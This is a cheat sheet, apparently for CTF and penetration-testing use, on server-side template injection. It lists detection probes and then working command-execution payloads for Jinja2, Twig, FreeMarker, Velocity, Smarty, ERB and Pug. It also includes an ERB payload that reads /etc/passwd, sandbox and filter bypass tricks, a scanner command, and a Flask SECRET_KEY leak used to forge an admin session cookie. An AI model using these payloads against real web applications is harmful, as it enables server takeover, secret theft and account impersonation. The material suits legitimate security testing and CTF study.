# SSTI — Server-Side Template Injection

Template engines on the server evaluate your input as code. The attacker's job: identify the engine, then abuse its sandbox.

## Detect the engine

```
# Fire these in every parameter that reflects back:
{{7*7}}        {{7*'7'}}       ${7*7}         *{7*7}         #{7*7}        <%= 7*7 %>
```

| Input | Output | Engine |
| --- | --- | --- |
| `{{7*7}}` → `49` | — | Jinja2, Twig, Nunjucks, Liquid |
| `{{7*'7'}}` → `7777777` | — | Jinja2 (Python integer*string) |
| `{{7*'7'}}` → `49` | — | Twig (PHP coerces) |
| `${7*7}` → `49` | — | FreeMarker, Thymeleaf, JSP EL, Spring |
| `*{7*7}` → `49` | — | Thymeleaf (expression) |
| `#{7*7}` → `49` | — | Thymeleaf, Rails ERB (Ruby) |
| `<%= 7*7 %>` → `49` | — | ERB (Ruby), EJS (Node) |
| `${{7*7}}` → `49` | — | Pebble, Handlebars (sometimes) |
| `{{= 7*7 }}` → `49` | — | Mustache / Dust |
| `#set($x=7*7)$x` → `49` | — | Velocity |

If the probe reflects *literally* (no evaluation), it's not SSTI — may still be XSS.

## Jinja2 (Python) — most common in CTF

```python
# Breakout to Python via class hierarchy:
{{ ''.__class__.__mro__[1].__subclasses__() }}
# Pick an index for a class with __init__ that gives you os.popen or similar
{{ ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['os'].popen('id').read() }}

# Modern Jinja2 shortcuts:
{{ config }}                                              # Flask app config (often has SECRET_KEY)
{{ config.items() }}
{{ get_flashed_messages.__globals__['__builtins__'] }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__.os.popen('id').read() }}
{{ url_for.__globals__['__builtins__']['__import__']('os').popen('id').read() }}
```

## Twig (PHP)

```
{{7*7}}                                                   # confirm
{{ _self.env.registerUndefinedFilterCallback("exec") }}
{{ _self.env.getFilter("id") }}
{{ ['id',''] | sort('system') }}                          # 1.x
{{ ['id'] | filter('system') }}
```

## FreeMarker

```
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id") }
```

## Velocity (Java)

```
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id'))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

## Smarty (PHP)

```
{system('id')}                        # with security_level off
{php}echo `id`;{/php}                 # Smarty 3.x
```

## ERB (Ruby)

```
<%= 7*7 %>
<%= `id` %>                           # backticks
<%= system("id") %>
<%= File.open('/etc/passwd').read %>
```

## Pug / Jade (Node)

```
#{7*7}
#{process.mainModule.require('child_process').execSync('id').toString()}
```

## Common bypass tricks

- **Blocked `.`**: use `__class__['__base__']` → `__class__.__base__`
- **Blocked `_`**: use `|attr('__class__')`, Jinja2 attr filter
- **Blocked `[`**: use `.pop(N)` or `__getitem__(N)`
- **Blocked `{{`**: use `{%  %}` (statement block)
  ```
  {% for x in ().__class__.__base__.__subclasses__() %}
    {% if 'warning' in x.__name__ %} {{ x() }} {% endif %}
  {% endfor %}
  ```
- **Length limit**: break payload across multiple requests, store in session/cookie, assemble server-side.

## Automated

```bash
tplmap -u 'http://target/?q=*'                   # SSTI scanner (not on CSG approved list; manual works fine)
```

## Flask config dump → SECRET_KEY → cookie forging

```
{{ config['SECRET_KEY'] }}
# then:
flask-cookie forge '{"user":"admin"}' '<leaked-key>'
```

## Offline reference

```bash
ls /opt/tools/PayloadsAllTheThings/Server\ Side\ Template\ Injection/
rg -n 'ssti|jinja' /opt/tools/HackTricks/
```

## Tips
- Detect first, exploit later — firing Jinja payloads at a Twig app wastes time.
- Flask + SSTI = pwned app config in one request (`{{ config }}`).
- Many "SSTI" bugs really come from `render_template_string(user_input)` — grep for that pattern in source if you have whitebox.
- `cycler`, `joiner`, `namespace`, `lipsum` are cleaner Jinja2 payloads than `__subclasses__` traversal.
